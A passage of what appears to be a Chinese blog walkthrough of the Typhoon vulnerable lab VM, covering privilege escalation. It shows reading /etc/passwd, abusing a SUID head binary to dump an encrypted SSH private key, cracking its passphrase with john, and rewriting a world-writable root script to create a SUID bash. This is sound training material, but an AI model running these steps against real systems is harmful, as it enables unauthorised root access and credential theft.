class="hljs-built_in">link</span>/ether 02:42:bc:90:00:31 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 8e:16:41:6c:32:c8 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>www-data@typhoon:/var/www/html/mongoadmin<span class="hljs-variable">$uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux typhoon.local 3.13.0-32-generic <span class="hljs-comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@typhoon:/var/www/html/mongoadmin$ python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br>&lt;tml/mongoadmin$ python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span>              <br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">export</span> TERM=xterm-color<br><span class="hljs-built_in">export</span> TERM=xterm-color<br>www-data@typhoon:/var/www/html/mongoadmin$ <br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h3><p>进行信息收集，先看当前目录下的 index.php，确定没有敏感信息后，在系统中进行寻找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br><span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br>root:x:0:0:root:/root:/bin/bash<br>postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br>typhoon:x:1000:1000:typhoon,,,:/home/typhoon:/bin/bash<br>admin:x:1001:1001:,,,:/home/admin:/bin/bash<br>postfixuser:x:1002:1002:,,,:/home/postfixuser:/bin/bash<br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>passwd 文件和 crontab 文件没什么收获</p>
+<h3 id="home-目录信息收集"><a href="#home-目录信息收集" class="headerlink" title="home 目录信息收集"></a>home 目录信息收集</h3><p>进入 home 目录看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>admin  postfixuser  typhoon<br>www-data@typhoon:/home$ <span class="hljs-built_in">cd</span> admin<br><span class="hljs-built_in">cd</span> admin<br>www-data@typhoon:/home/admin$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 32K<br>917516 drwxr-xr-x 4 admin admin 4.0K Oct 22  2018 .<br>917505 drwxr-xr-x 5 root  root  4.0K Oct 23  2018 ..<br>917529 -rw------- 1 admin admin   40 Oct 25  2018 .bash_history<br>917518 -rw-r--r-- 1 admin admin  220 Oct 22  2018 .bash_logout<br>917517 -rw-r--r-- 1 admin admin 3.6K Oct 22  2018 .bashrc<br>917520 drwx------ 2 admin admin 4.0K Oct 22  2018 .cache<br>917519 -rw-r--r-- 1 admin admin  675 Oct 22  2018 .profile<br>917527 drwxr-xr-x 2 root  root  4.0K Oct 25  2018 .ssh<br>917522 -rw-r--r-- 1 admin admin    0 Oct 22  2018 .sudo_as_admin_successful<br>www-data@typhoon:/home/admin$ <span class="hljs-built_in">cd</span> .ssh<br><span class="hljs-built_in">cd</span> .ssh<br>www-data@typhoon:/home/admin/.ssh$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>917527 drwxr-xr-x 2 root  root  4.0K Oct 25  2018 .<br>917516 drwxr-xr-x 4 admin admin 4.0K Oct 22  2018 ..<br>932596 -rw-r--r-- 1 admin admin   42 Oct 24  2018 secr3t<br>www-data@typhoon:/home/admin/.ssh$ <span class="hljs-built_in">cat</span> secr3t<br><span class="hljs-built_in">cat</span> secr3t<br>&lt;h0h0h0&gt;<br><br>ph00n_typ_p0st_flag!<br><br>&lt;/h0h0h0&gt;<br>www-data@typhoon:/home/admin/.ssh$ <span class="hljs-built_in">cd</span> ../../postfixuser<br><span class="hljs-built_in">cd</span> ../../postfixuser<br>www-data@typhoon:/home/postfixuser$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>932184 drwxr-xr-x 2 postfixuser postfixuser 4.0K Oct 23  2018 .<br>917505 drwxr-xr-x 5 root        root        4.0K Oct 23  2018 ..<br>932186 -rw-r--r-- 1 postfixuser postfixuser  220 Oct 23  2018 .bash_logout<br>932185 -rw-r--r-- 1 postfixuser postfixuser 3.6K Oct 23  2018 .bashrc<br>932187 -rw-r--r-- 1 postfixuser postfixuser  675 Oct 23  2018 .profile<br>www-data@typhoon:/home/postfixuser$ <span class="hljs-built_in">cd</span> ../../typhoon<br><span class="hljs-built_in">cd</span> ../../typhoon<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>923939 drwxr-xr-x  2 root root 4.0K Oct 23  2018 .<br>     2 drwxr-xr-x 25 root root 4.0K Oct 24  2018 ..<br>923940 -rw-r--r--  1 root root   24 Oct 23  2018 .secret<br>923942 -rw-------  1 root root 1.8K Oct 23  2018 .secret.rsa<br>923941 -rw-r--r--  1 root root   63 Oct 24  2018 secret<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">cat</span> .secret.rsa<br><span class="hljs-built_in">cat</span> .secret.rsa<br><span class="hljs-built_in">cat</span>: .secret.rsa: Permission denied<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">cat</span> .secret<br><span class="hljs-built_in">cat</span> .secret<br>belong to typhoon user.<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">cat</span> secret<br><span class="hljs-built_in">cat</span> secret<br><span class="hljs-built_in">test</span> file<br>&lt;rec0nm4st3r&gt; R3c0n_m4steeeee3er_fl4g &lt;/rec0nm4st3r&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我们比较感兴趣的 <code>.secret.rsa</code> 文件没有读取权限，看看 s 权限文件有没有可以帮忙的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/var/www/html/cms$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>&lt;tml/cms$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null                        <br> 14223   20 -rwsr-sr-x   1 libuuid  libuuid     18904 Jun  3  2014 /usr/sbin/uuidd<br> 14192  336 -rwsr-xr--   1 root     dip        343168 Jan 23  2013 /usr/sbin/pppd<br>   123   40 -rwsr-xr-x   1 root     root        39584 Mar 24  2014 /usr/bin/head<br>   184   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp<br>    44   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh<br> 14475   16 -rwsr-xr-x   1 root     lpadmin     14336 Jul 18  2014 /usr/bin/lppasswd<br> 14407   24 -rwsr-xr-x   1 root     root        23304 Feb 11  2014 /usr/bin/pkexec<br>    41   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn<br> 14283   52 -rwsr-sr-x   1 daemon   daemon      51464 Oct 21  2013 /usr/bin/at<br>   115   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd<br>   196   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd<br> 14168   76 -rwsr-xr-x   1 root     root        75256 Oct 21  2013 /usr/bin/mtr<br>   302  152 -rwsr-xr-x   1 root     root       155008 Feb 10  2014 /usr/bin/sudo<br> 14642   88 -rwsr-sr-x   1 root     mail        89216 Oct 21  2013 /usr/bin/procmail<br> 14691 2144 -rwsr-xr-x   1 root     root      2191736 Jan  2  2014 /usr/bin/vim.basic<br> 14141   24 -rwsr-xr-x   1 root     root        23104 May  8  2014 /usr/bin/traceroute6.iputils<br>  1023   12 -rwsr-xr-x   1 root     root        10344 Apr 12  2014 /usr/lib/pt_chown<br>144019  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign<br>532019   12 -rwsr-xr-x   1 root     root        10528 Jun 11  2012 /usr/lib/authbind/helper<br>270214   16 -rwsr-xr-x   1 root     root        14768 Feb 11  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br> 12275  304 -rwsr-xr--   1 root     messagebus   310800 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   392   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>790141   36 -rwsr-xr-x   1 root     root        35608 Jun 28  2013 /sbin/mount.cifs<br>804667   92 -rwsr-xr-x   1 root     root        94168 Nov  6  2015 /sbin/mount.nfs<br>658417   32 -rwsr-xr-x   1 root     root        30800 Dec 16  2013 /bin/fusermount<br>655433   44 -rwsr-xr-x   1 root     root        44680 May  8  2014 /bin/ping6<br>655419   96 -rwsr-xr-x   1 root     root        94792 Jun  3  2014 /bin/mount<br>655432   44 -rwsr-xr-x   1 root     root        44168 May  8  2014 /bin/ping<br>655452   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su<br>655460   68 -rwsr-xr-x   1 root     root        69120 Jun  3  2014 /bin/umount<br></code></pre></td></tr></table></figure>
+
+<h3 id="head-文件-SUID-任意文件读取-ssh-密钥"><a href="#head-文件-SUID-任意文件读取-ssh-密钥" class="headerlink" title="head 文件 SUID 任意文件读取 ssh 密钥"></a>head 文件 SUID 任意文件读取 ssh 密钥</h3><p>head 文件具有 s 权限，根据 gtfobins 可以实现任意文件读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/typhoon$ <span class="hljs-built_in">head</span> -c1G .secret.rsa<br><span class="hljs-built_in">head</span> -c1G .secret.rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: AES-128-CBC,C5D65028BD98AC3E19489791F67CA768<br><br>/HkN7JJC6GUhdC9QqGQENXBZ4gmSFyNf3FQujcAG7FudOttBNb5uwYznR/fUHQ3Y<br>zySvHRxesWPSmbH+JnYZabS6J5BfNVLjo6GI/+M0uauh6g7o5FpgVQV1aezGf7VE<br>yH1HBMUarF2ei2ipxPI4bDTBIAOeec9HExagtzHTfryHQOD8qzglUTXRiEYP4/nz<br>y5akLWJp0aicgw8VzqA6JuRYgFvpaV2V7OLUEIwITpxP2q1xrEATY+N9ASM+LIUF<br>hwLfqCxinnzd5ObuF474qluHa2U1IoIFgOjxvQXzN1s6wqIUWPcV2w21QzoJ/cJf<br>Ro5nYZkygcoAHFB1ioQjPHD/HA8wjAPxyP5L1a1zR/PdsxcqqABH7TOJHLVT1ZYa<br>Koh5cmvch9nzTkowQpLnnOPF6smWIYAF6EzLx4Yx1E93w+0Fvvlq6ptRO+ZcNMhy<br>T3s31tqELLM/UbjR3O/dXOVXZuSCPG6okuy7FJ9xAW8k24FmITaHENaIYYzT74Xo<br>fTZjzbwY6QnSb7L+cy70r8CRBi0ESFWyEs2IWyWe8CrsZWtXLkl6O9FVE1ME1geB<br>UaonqZeIfG/fFlsXZTI1jYLvDC3yK1VBdb/fxqZTx+z10KenaKZEvM5IdlS8iBnv<br>Wtbl7v1CrTc9DL924Ul3u1sIhiKvBcu4wtoSEyUcwL08yyVJLrGr5GiKn98ZWECX<br>CAeXPUG2UCNQCYXXsE85u6TBVPGVlsETGtYLvRMwJAtAs79NZbuqIFXmQNGUEP8P<br>nLuw0cdit7sQT6AhIlmgXaqOfjKSS8gfOhVo5sHrvQTshjee0VD8Zgerqql0nqez<br>/yN5kLVn+XWx7SLBHmZnvatFY1KbT3j+y0Cw1kB/ckX+5Ui5fZH3ojauNA+Q5Gtt<br>5rfS4NeAaOYbY5ris+9zprWQ6wI8Yw82psN/sSqI4dVsv9asVkQ7/U7JD7mEEtal<br>u3BuhzhWMHaf+7elorzBTcTs+dTQBGh+wIRGxmhclL5tN7VQ+WJQRKp3b761LnYC<br>LrsWJIpqmvAEpSlvkD01erLu8yUDV2oCC4Y59+1f/xDhX3Qzgy3PYnMTlz7+YVXx<br>klfjpXFgZNJS+H1D8BWR22rkMwQ3x2ylq3QuL8JmAbEAzzUSBXPQY7IQpy8IQSbh<br>XhAopk52jhC3BZ+Pe1wI84AztSwCIcKrnJkoe2lsIu5gOQnCg91DQQqUe+G9TC+o<br>wDXxZMBYWsuZxQ9pN3EMto3iNedkDlMfps6ElplJS6Ci3IGtR2ceHsw/r11j+46j<br>zoM6pBTr8EGDjzintA9a7MhFZ/afXSRYOfxIZA6ijvc21mT838LMeQOHw414t4o7<br>IfpyWmlkfLNJSeWA9KcQ2t+kcM0VuTW0OAHtiNn6qTzClsryBaT2LFSNyMwIRt0p<br>21zYncZu5xc33XwEFZyfi3s/1K+Xw0x4rYqWaGTXQbfXciQgHqGTP0epA54/a+pg<br>edJ7yiGoUAOTvE82vghvTS3Qa9+jSvgGg1m1i1a0bxWT+7YSSD2Io1n+N0mDheAG<br>KCuixP7PfjsNiYLmZoBJIQ30WA1r+4HCQXHDU4o1zpJKy69rOMPyK28MRqI/Kf6X<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>将上述私钥写入本地文件 sshkey 中，ssh 私钥登录试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i sshkey typhoon@192.168.56.121<br></code></pre></td></tr></table></figure>
+
+<h3 id="john-爆破-ssh-密钥口令"><a href="#john-爆破-ssh-密钥口令" class="headerlink" title="john 爆破 ssh 密钥口令"></a>john 爆破 ssh 密钥口令</h3><p>但是提示需要口令，那就 john 爆破吧，爆破前使用 ssh2john 命令来进行格式转换，将文件写入 rsa_hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ ssh2john sshkey &gt; rsa_hash<br><br>┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash <br>sshkey:789456123<br><br>1 password <span class="hljs-built_in">hash</span> cracked, 0 left<br></code></pre></td></tr></table></figure>
+
+<p>爆破得到结果，使用密钥登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ ssh -i sshkey typhoon@192.168.56.121     <br>    d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db <br>    `~~88~~<span class="hljs-string">&#x27; `8b  d8&#x27;</span> 88  `8D 88   88 .8P  Y8. .8P  Y8. 888o  88 <br>       88     `8bd8<span class="hljs-string">&#x27;  88oodD&#x27;</span> 88ooo88 88    88 88    88 88V8o 88 <br>       88       88    88~~~   88~~~88 88    88 88    88 88 V8o88 <br>       88       88    88      88   88 `8b  d8<span class="hljs-string">&#x27; `8b  d8&#x27;</span> 88  V888 <br>       YP       YP    88      YP   YP  `Y88P<span class="hljs-string">&#x27;   `Y88P&#x27;</span>  VP   V8P <br>                                                             <br>                 Vulnerable VM By PRISMA CSI - www.prismacsi.com<br><br>WARNING:  Unauthorized access to this system is forbidden and will be<br>prosecuted by law. By accessing this system, you agree that your actions<br>may be monitored <span class="hljs-keyword">if</span> unauthorized usage is suspected.<br><br>                This is a joke of course :))<br>                Please hack me!<br><br>-----------------------------------------------------------------------<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;sshkey&#x27;</span>: <br>sign_and_send_pubkey: no mutual signature supported<br>typhoon@192.168.56.121\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com/</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Sun Jul  2 20:10:31 EEST 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.0                Users logged in:        0</span><br><span class="hljs-string">  Usage of /:   18.9% of 17.34GB   IP address for eth0:    192.168.56.121</span><br><span class="hljs-string">  Memory usage: 40%                IP address for docker0: 172.17.0.1</span><br><span class="hljs-string">  Swap usage:   0%                 IP address for virbr0:  192.168.122.1</span><br><span class="hljs-string">  Processes:    181</span><br><span class="hljs-string"></span><br><span class="hljs-string">  Graph this data and manage this system at:</span><br><span class="hljs-string">    https://landscape.canonical.com/</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Sun Jul  2 20:10:31 2023 from 192.168.56.106</span><br></code></pre></td></tr></table></figure>
+
+<p>有个必要有意思的事情，似乎是签名算法不匹配的问题，最后还是要输入密码，而口令恰好也是密码</p>
+<h3 id="可写文件列表"><a href="#可写文件列表" class="headerlink" title="可写文件列表"></a>可写文件列表</h3><p>s 权限的文件列表和 www-data用户相同 ，因此看看可写文件列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:/var/www/html$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/var*&quot;</span> -not -path <span class="hljs-string">&quot;/proc*&quot;</span> -not -path <span class="hljs-string">&quot;/sys*&quot;</span> 2&gt;/dev/null<br>/tmp/7ff18ca11a1a43036e852fb2c82c62aa.dat<br>/tmp/b5caab02810ae00ce47f27a6151ab3d2.dat<br>/tmp/f71487e6e9c666dc5b99e37305c00db5.dat<br>/tmp/f0d37d8381109e98099ecb474141283a.dat<br>/tmp/c7007124bd83d0879dc799c95d5b219e.dat<br>/tmp/8c10a35add3f21e11383c7911852072e.dat<br>/tmp/a119d9ddd9ebcf658e28eac9773d7c07.dat<br>/tmp/65d9383ff514cbd01ac65e38806095d7.dat<br>/home/typhoon/.bashrc<br>/home/typhoon/.ssh/id_rsa<br>/home/typhoon/.ssh/id_rsa.pub<br>/home/typhoon/.ssh/known_hosts<br>/home/typhoon/.mysql_history<br>/home/typhoon/.cache/motd.legal-displayed<br>/home/typhoon/.bash_logout<br>/home/typhoon/.bash_history<br>/home/typhoon/.profile<br>/tab/script.sh<br></code></pre></td></tr></table></figure>
+
+<p>可写文件列表中看到有个&#x2F;tab&#x2F;script.sh 文件，看看这个文件的基本信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:~$ <span class="hljs-built_in">ls</span> -liah /tab/script.sh<br>536243 -rwxrwxrwx 1 root root 68 Oct 24  2018 /tab/script.sh<br>typhoon@typhoon:~$ <span class="hljs-built_in">cat</span> /tab/script.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Typhoon is UP!&quot;</span><br><br><span class="hljs-comment">#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>竟然有个 root 属主的所有用户可读写的 sh 文件，那就简单了，反弹 shell 或者复制 bash 后赋予 s 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&quot;</span> &gt;/tab/script.sh<br>typhoon@typhoon:~$ /tab/script.sh<br></code></pre></td></tr></table></figure>
+
+<p>这样我们就获得了一个 s 权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:/tmp$ <span class="hljs-built_in">ls</span> -liah<br>total 1.1M<br>655482 drwxrwxrwt  7 root     root     4.0K Jul  3 01:16 .<br>     2 drwxr-xr-x 25 root     root     4.0K Oct 24  2018 ..<br>667536 -rw-rw-rw-  1 www-data www-data   33 Jul  2 17:59 65d9383ff514cbd01ac65e38806095d7.dat<br>667553 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 7ff18ca11a1a43036e852fb2c82c62aa.dat<br>667546 -rw-rw-rw-  1 www-data www-data   33 Jul  2 17:59 8c10a35add3f21e11383c7911852072e.dat<br>667550 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 a119d9ddd9ebcf658e28eac9773d7c07.dat<br>667549 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 b5caab02810ae00ce47f27a6151ab3d2.dat<br>667555 -rwsr-sr-x  1 root     root     994K Jul  2 20:33 bash<br>667552 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 c7007124bd83d0879dc799c95d5b219e.dat<br>667548 -rw-rw-rw-  1 www-data www-data 8.2K Jul  2 17:59 f0d37d8381109e98099ecb474141283a.dat<br>667547 -rw-rw-rw-  1 www-data www-data   28 Jul  2 17:59 f71487e6e9c666dc5b99e37305c00db5.dat<br>667534 prw-r--r--  1 www-data www-data    0 Jul  2 17:22 foo<br>665597 drwxr-xr-x  2 tomcat7  tomcat7  4.0K Jul  2 02:42 hsperfdata_tomcat7<br>659034 drwxrwxrwt  2 root     root     4.0K Jul  2 02:42 .ICE-unix<br>659035 srwx------  1 mongodb  mongodb     0 Jul  2 02:42 mongodb-27017.sock<br>667554 -rw-------  1 root     typhoon  4.0K Jul  2 20:37 .test.swp<br>665596 drwxr-xr-x  2 tomcat7  root     4.0K Jul  2 02:42 tomcat7-tomcat7-tmp<br>667551 drwxrwxrwx  2 www-data www-data 4.0K Jul  2 17:59 translations<br>658262 drwxrwxrwt  2 root     root     4.0K Jul  2 02:42 .X11-unix<br></code></pre></td></tr></table></figure>
+
